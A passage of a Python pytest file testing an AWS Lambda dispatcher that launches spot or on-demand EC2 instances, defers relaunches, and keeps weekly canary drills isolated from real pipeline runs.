    out = idx.handler(_event(force_on_demand="true"), None)
    assert out["launched"] is True
    assert out["market"] == "on-demand"
    assert out["force_on_demand"] is True
    assert seen == [False]  # single attempt, spot=False — no spot try at all


def test_force_on_demand_defaults_false_spot_first(monkeypatch):
    seen = []

    def _launch(types_, subnets, **kw):
        seen.append(kw.get("spot"))
        return "i-spot"

    idx = _load(monkeypatch, launch_impl=_launch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(), None)
    assert out["launched"] is True
    assert out["market"] == "spot"
    assert out["force_on_demand"] is False
    assert seen == [True]


def test_force_on_demand_malformed_returns_clean_false(monkeypatch):
    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(force_on_demand="yes-please"), None)
    assert out["launched"] is False
    assert out["reason"] == "invalid_event"
    assert idx._test_ssm.sent == []


def test_defer_payload_carries_force_on_demand(monkeypatch):
    """A deferred re-invoke must not lose the on-demand escalation: the
    one-shot schedule's payload carries force_on_demand through, so the
    relaunch stays on-demand when it finally fires."""
    idx = _load(
        monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"},
        running_instances={
            ("saturday", "ne-weekly-freshness-pipeline", "2026-07-11"): ["i-still-dying"],
        },
    )
    out = idx.handler(_event(force_on_demand="true"), _FakeContext())
    assert out["reason"] == "deferred"
    (sched,) = idx._test_scheduler.created
    payload = json.loads(sched["Target"]["Input"])
    assert payload["force_on_demand"] == "true"


def test_disabled_flag_short_circuits(monkeypatch):
    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "false"})
    out = idx.handler(_event(), None)
    assert out["launched"] is False
    assert out["reason"] == "disabled"
    assert idx._test_ssm.sent == []


def test_deploy_sh_launch_config_pins_match_index_defaults(monkeypatch):
    """LOCKSTEP GUARD (config#2265): deploy.sh pins SF_WATCH_AMI_ID /
    SF_WATCH_SECURITY_GROUP / SF_WATCH_SUBNETS into the deployed Lambda env —
    the observable source of truth sf-watch-liveness-probe reads to verify the
    launch config (AMI/SG/subnets) still exists twice daily. The pins MUST
    equal this module's own in-code defaults, or the probe would verify a
    DIFFERENT launch config than the one an env-stripped dispatcher would
    actually launch with. Mirrors the probe's own EXPECTED_PIPELINE_NAMES
    source-text lockstep guard."""
    for var in ("SF_WATCH_AMI_ID", "SF_WATCH_SECURITY_GROUP", "SF_WATCH_SUBNETS"):
        monkeypatch.delenv(var, raising=False)
    idx = _load(monkeypatch)

    deploy_sh = open(os.path.join(os.path.dirname(__file__), "deploy.sh")).read()
    pins = {}
    for var in ("LAUNCH_AMI_ID", "LAUNCH_SECURITY_GROUP", "LAUNCH_SUBNETS"):
        m = re.search(rf'^{var}="([^"]+)"$', deploy_sh, re.M)
        assert m is not None, (
            f"deploy.sh no longer pins {var} — the liveness probe would alert "
            "a MISSING launch-config key on every run after the next deploy"
        )
        pins[var] = m.group(1)

    assert pins["LAUNCH_AMI_ID"] == idx.AMI_ID
    assert pins["LAUNCH_SECURITY_GROUP"] == idx.SECURITY_GROUP
    assert [s.strip() for s in pins["LAUNCH_SUBNETS"].split(",")] == idx.SUBNETS

    # And the env JSON template actually carries all three pins into the
    # deployed env (both the bootstrap create AND the every-deploy update use
    # lambda_env_json).
    for env_key in ("SF_WATCH_AMI_ID", "SF_WATCH_SECURITY_GROUP", "SF_WATCH_SUBNETS"):
        assert f'\\"{env_key}\\"' in deploy_sh or f'"{env_key}"' in deploy_sh, (
            f"deploy.sh's lambda_env_json no longer sets {env_key}"
        )


# ── config#2223: weekly synthetic canary drill ───────────────────────────────


def _drill_event(**overrides):
    """Mirror of the static EventBridge Scheduler Input deploy.sh's --bootstrap
    wires (run_date deliberately absent — the handler ALWAYS synthesizes it)."""
    base = {
        "is_drill": "true",
        "pipeline_name": "ne-weekly-freshness-pipeline",
        "cadence_slug": "saturday",
        "execution_arn": "arn:aws:states:us-east-1:711398986525:execution:ne-weekly-freshness-pipeline:canary-drill",
        "cause": "synthetic weekly canary drill of the dispatch pipe (config#2223) - not a real failure",
    }
    base.update(overrides)
    return base


def _expected_drill_run_date():
    from datetime import datetime, timezone
    return f"drill-{datetime.now(timezone.utc):%Y-%m-%d}"


def test_drill_event_launches_with_drill_scoped_run_date_and_drill_tag(monkeypatch):
    """The happy path the weekly canary exists to verify: a drill payload
    round-trips the REAL launch pipe (spot launch + tags + SSM bootstrap),
    with the drill-scoped run_date threaded everywhere a real run_date would
    be, plus the sf-watch-drill discriminator tag."""
    calls = {}

    def _launch(types_, subnets, **kw):
        calls["extra_tags"] = kw.get("extra_tags")
        return "i-stub"

    idx = _load(monkeypatch, launch_impl=_launch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out = idx.handler(_drill_event(), None)
    drill_date = _expected_drill_run_date()
    assert out["launched"] is True
    assert out["is_drill"] is True
    assert out["run_date"] == drill_date
    # Tags: the normal discriminator triple (run_date drill-scoped) PLUS the
    # drill marker tag fleet consumers filter on — all riding the SAME
    # RunInstances call as the launch (config#2292 root fix).
    assert calls["extra_tags"] == {
        "sf-watch-cadence": "saturday",
        "sf-watch-pipeline": "ne-weekly-freshness-pipeline",
        "sf-watch-run-date": drill_date,
        "sf-watch-drill": "true",
    }
    cmd = idx._test_ssm.sent[0]["Parameters"]["commands"][0]
    assert '--is-drill "true"' in cmd
    assert f'--run-date "{drill_date}"' in cmd
    # The synthesized watch_log_key is drill-scoped too (never a real key).
    assert f'--watch-log-key "consolidated/saturday_sf_watch/{drill_date}.json"' in cmd


def test_drill_run_date_is_synthesized_never_taken_from_payload(monkeypatch):
    """ISOLATION INVARIANT (see index.DRILL_RUN_DATE_PREFIX): even a payload
    that smuggles a real run_date into a drill gets the code-synthesized
    drill run_date — no payload can point a drill at a real dispatch's
    lock/marker/watch-log keys."""
    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out = idx.handler(_drill_event(run_date="2026-07-11"), None)
    assert out["launched"] is True
    assert out["run_date"] == _expected_drill_run_date()
    cmd = idx._test_ssm.sent[0]["Parameters"]["commands"][0]
    assert '--run-date "2026-07-11"' not in cmd


def test_drill_run_date_can_never_collide_with_a_real_run_date(monkeypatch):
    """Pins the structural non-collision every drill-vs-real isolation claim
    rests on (index.DRILL_RUN_DATE_PREFIX comment): a real run_date always
    matches _RUN_DATE_RE, a drill run_date never does — so the concurrency
    lock, completion-marker key, watch-log key, and the saturday dispatcher's
    config#2269 per-run_date budget can never mix the two."""
    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    drill_date = _expected_drill_run_date()
    assert drill_date.startswith(idx.DRILL_RUN_DATE_PREFIX)
    assert idx._RUN_DATE_RE.match("2026-07-11")
    assert not idx._RUN_DATE_RE.match(drill_date)


def test_drill_concurrent_skip_never_defers(monkeypatch):
    """A drill is not a repair: a live drill box for the same day skips
    cleanly — it must NOT mint a defer-not-drop one-shot schedule (that
    machinery exists so REAL failures are never dropped)."""
    drill_date = _expected_drill_run_date()
    idx = _load(
        monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"},
        running_instances={
            ("saturday", "ne-weekly-freshness-pipeline", drill_date): ["i-drill-live"],
        },
    )
    out = idx.handler(_drill_event(), _FakeContext())
    assert out["launched"] is False
    assert out["reason"] == "drill_concurrent_skip"
    assert out["is_drill"] is True
    assert out["existing_instance_ids"] == ["i-drill-live"]
    assert idx._test_scheduler.created == []
    assert idx._test_ssm.sent == []


def test_real_dispatch_is_not_blocked_by_a_live_drill_box(monkeypatch):
    """The other direction of the isolation invariant: a live drill box holds
    only the drill-scoped lock key, so a real failure for the same
    (cadence, pipeline) on the same day still launches."""
    drill_date = _expected_drill_run_date()
    idx = _load(
        monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"},
        running_instances={
            ("saturday", "ne-weekly-freshness-pipeline", drill_date): ["i-drill-live"],
        },
    )
    out = idx.handler(_event(), None)
    assert out["launched"] is True


def test_malformed_is_drill_returns_clean_false(monkeypatch):
    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out = idx.handler(_drill_event(is_drill="yes-please"), None)
    assert out["launched"] is False
    assert out["reason"] == "invalid_event"
    assert idx._test_ssm.sent == []


def test_non_drill_dispatch_carries_no_drill_tag_and_is_drill_false(monkeypatch):
    calls = {}

    def _launch(types_, subnets, **kw):
        calls["extra_tags"] = kw.get("extra_tags")
        return "i-stub"

    idx = _load(monkeypatch, launch_impl=_launch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(), None)
    assert out["launched"] is True
    assert out["is_drill"] is False
    assert "sf-watch-drill" not in calls["extra_tags"]
    cmd = idx._test_ssm.sent[0]["Parameters"]["commands"][0]
    assert '--is-drill "false"' in cmd
